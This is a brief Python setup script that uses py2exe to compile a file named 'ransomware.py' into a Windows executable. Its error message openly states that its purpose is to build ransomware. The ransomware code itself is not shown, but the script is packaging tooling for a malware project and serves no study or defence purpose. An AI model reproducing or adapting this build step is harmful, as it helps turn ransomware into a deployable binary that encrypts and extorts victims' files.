from platform import system
from distutils.core import setup
try:
    import py2exe
except:
    raise Exception(f"Can't Build Ransomware On A {system()} System")
    exit()

from cryptography.fernet import Fernet
import os, glob, sys

sys.argv.append('py2exe')
setup(console=['ransomware.py'])
